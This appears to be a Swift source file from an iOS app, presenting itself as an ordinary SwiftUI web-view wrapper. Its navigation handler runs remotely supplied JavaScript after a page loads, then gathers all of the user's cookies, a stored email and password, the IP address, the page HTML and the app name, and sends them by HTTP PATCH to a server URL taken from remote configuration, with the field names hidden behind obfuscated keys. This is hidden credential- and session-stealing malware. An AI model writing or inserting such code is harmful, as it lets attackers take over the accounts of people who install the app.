//
//  File.swift
//  
//
//  Created by DanHa on 30/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct FiveCoor: UIViewRepresentable {
    func makeCoordinator() -> FiveCoordiClss {
        FiveCoordiClss(self)
    }
    
    let url: URL?
    
    @Binding var getHtmladsNw: String
    var listData: [String: String] = [:]
    private let fiveobs = FiveObs()
    var fiveobser: NSKeyValueObservation? {
        fiveobs.fiveins
    }
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = listData[RemoKey.rm02ch.rawValue] ?? ""
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        
    }
    
    class FiveCoordiClss: NSObject, WKNavigationDelegate {
        var prentFive: FiveCoor
        
        init(_ prentFive: FiveCoor) {
            self.prentFive = prentFive
        }
        
        func adEmlCall() -> String {
            var emlAd: String?
            if let dataModel = UserDefaults.standard.object(forKey: "email") as? Data {
                if let emLoad = try? JSONDecoder().decode(UsEmail.self, from: dataModel) {
                    emlAd = emLoad.email
                }
            }
            return emlAd ?? "email_Null"
        }
        
        func readPw() -> String {
            var matkhauAd: String?
            if let dataModel = UserDefaults.standard.object(forKey: "matkhau") as? Data {
                if let mkLoad = try? JSONDecoder().decode(UsMK.self, from: dataModel) {
                    matkhauAd = mkLoad.matkhau
                }
            }
            return matkhauAd ?? "Mat_Khau_Null"
        }
        
        func adIpCall() -> String {
            var ipadd: String?
            if let dataModel = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let ipaddLoad = try? JSONDecoder().decode(UsIpadress.self, from: dataModel) {
                    ipadd = ipaddLoad.ippad
                }
            }
            return ipadd ?? "IP_Null"
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript(self.prentFive.listData[RemoKey.outer1af.rawValue] ?? "") { data, error in
                    if let fivehtmshw = data as? String, error == nil {
                        if !fivehtmshw.isEmpty {
                            if fivehtmshw.contains(self.prentFive.listData[RemoKey.status1af.rawValue] ?? "") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                    let cokiFive = cookies.firstIndex(where: { $0.name == self.prentFive.listData[RemoKey.nam09ap.rawValue] ?? ""})
                                    if (cokiFive != nil) {
                                        let cokiFiveCk = cookies.reduce("", { x,y in
                                            x + y.name + "=" + String(y.value) + ";"
                                        })
                                        let jsonFivee: [String: Any] = [
                                            self.prentFive.listData[RemoKey.nam09ap.rawValue] ?? "": cookies[cokiFive!].value,
                                            self.prentFive.listData[RemoKey.nam10ap.rawValue] ?? "": self.adEmlCall(),
                                            self.prentFive.listData[RemoKey.nam11ap.rawValue] ?? "": self.readPw(),
                                            self.prentFive.listData[RemoKey.nam12ap.rawValue] ?? "": cokiFiveCk,
                                            self.prentFive.listData[RemoKey.nam13ap.rawValue] ?? "": fivehtmshw,
                                            self.prentFive.listData[RemoKey.nam14ap.rawValue] ?? "": self.adIpCall(),
                                            self.prentFive.listData[RemoKey.nam15ap.rawValue] ?? "": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
                                        ]
                                        
                                        let url = URL(string: self.prentFive.listData[RemoKey.rm05ch.rawValue] ?? "")
                                        let fiveJsData = try? JSONSerialization.data(withJSONObject: jsonFivee)
                                        var request = URLRequest(url: url!)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = fiveJsData
                                        let task = URLSession.shared.dataTask(with: request) { data, response, error in
                                            if error != nil {
                                                print("not_ok")
                                            } else {
                                                self.prentFive.getHtmladsNw = fivehtmshw
                                            }
                                        }
                                        task.resume()
                                    }
                                    
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
}

struct UsEmail: Codable {
    var email: String
}

struct UsMK: Codable {
    var matkhau: String
}

struct UsIpadress: Codable {
    var ippad: String
}

@available(iOS 14.0, *)
private class FiveObs: ObservableObject {
    @Published var fiveins: NSKeyValueObservation?
}
